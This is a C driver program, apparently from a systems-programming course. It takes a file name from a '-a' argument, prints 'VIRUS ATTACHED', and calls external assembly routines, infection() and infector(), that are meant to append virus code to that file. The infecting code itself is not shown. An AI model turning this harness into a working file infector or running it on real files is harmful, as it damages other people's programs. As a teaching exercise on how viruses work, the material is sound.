#include "util.h"

#define SYS_OPEN     5
#define SYS_WRITE    4
#define SYS_CLOSE    6
#define SYS_EXIT     1
#define SYS_GETDENTS 141
#define STDOUT       1

extern void infection();
extern void infector(char* filename);
extern void system_call(int syscall, int arg1, int arg2, int arg3);


int main(int argc, char** argv) {
    if (argc < 2 || argv[1][0] != '-' || argv[1][1] != 'a') {
        system_call(SYS_EXIT, 0x55, 0, 0);
    }

    char* filename = argv[1] + 2;
    int filename_len = strlen(filename);


    system_call(SYS_WRITE, STDOUT, (int)"File name: ", 11);
    system_call(SYS_WRITE, STDOUT, (int)filename, filename_len);
    system_call(SYS_WRITE, STDOUT, (int)"\n", 1);
    system_call(SYS_WRITE, STDOUT,(int) "VIRUS ATTACHED", 15);
    system_call(SYS_WRITE, STDOUT,(int) "\n", 1);

    /* Call the assembly functions */
    infection();
    infector(filename);

    /* Print the virus attached message */
    system_call(SYS_WRITE, STDOUT, (int)"VIRUS ATTACHED\n", 15);

    return 0;
}






